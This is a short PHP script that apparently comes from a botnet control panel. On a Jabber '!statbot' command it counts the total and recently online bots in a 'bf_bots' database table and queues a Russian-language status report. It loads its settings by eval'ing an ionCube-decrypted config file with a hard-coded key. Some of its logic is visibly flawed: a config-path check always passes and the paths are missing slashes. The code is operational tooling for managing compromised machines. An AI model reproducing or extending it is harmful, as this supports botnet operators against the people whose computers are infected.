#!/usr/bin/php
<?php
set_time_limit(0);

$dir = pathinfo(__FILE__, PATHINFO_DIRNAME);
$dir_site = realpath($dir . '/../../');

function error_handler($code, $msg, $file, $line){
	global $dir_site;
	$error = array();
	$error['code'] = $code;
	$error['msg'] = $msg;
	$error['file'] = $file;
	$error['line'] = $line;
	file_put_contents($dir_site . '/cache/autocmd_errors_php.txt', print_r($error, true) . "\r\n", FILE_APPEND);
}
set_error_handler('error_handler');

function shutdown(){
    global $jabber;
    $jabber->disconnect();
}
register_shutdown_function('shutdown');

if(file_exists($dir_site . 'includes/config.cfg')){
   	eval(ioncube_read_file($dir_site . 'includes/config.cfg', true, 'cFRgp1LiXipHarUN'));
}elseif($dir_site . 'includes/config.php'){
	include_once($dir_site . 'includes/config.php');
}else{
	exit;
}

switch($argv['1']){
	case '!statbot':
    	$mysqli = new mysqli($cfg_db['host'], $cfg_db['user'], $cfg_db['pass'], $cfg_db['db']);

    	if(mysqli_connect_errno()){
    		file_put_contents($dir_site . '/cache/jabber/to_' . $argv['1'] . '_' . mt_rand() . time(), 'MySQL error.');
    	}else{
    		$mysqli->real_query("SET NAMES utf8");
    		$result = $mysqli->query('SELECT COUNT(id) count FROM bf_bots');
    		$count = $result->fetch_object();

    		$result = $mysqli->query('SELECT COUNT(country) count FROM bf_bots WHERE (last_date > \''.(time()-(30*60)).'\')');
    		$count_live = $result->fetch_object();

			file_put_contents($dir_site . '/cache/jabber/to_' . $argv['2'] . '_' . mt_rand() . time(), 'Всего ботов: ' . $count->count . "\r\n" . 'Всего онлайн: ' . $count_live->count . "\r\n");
    	}
	break;
}

?>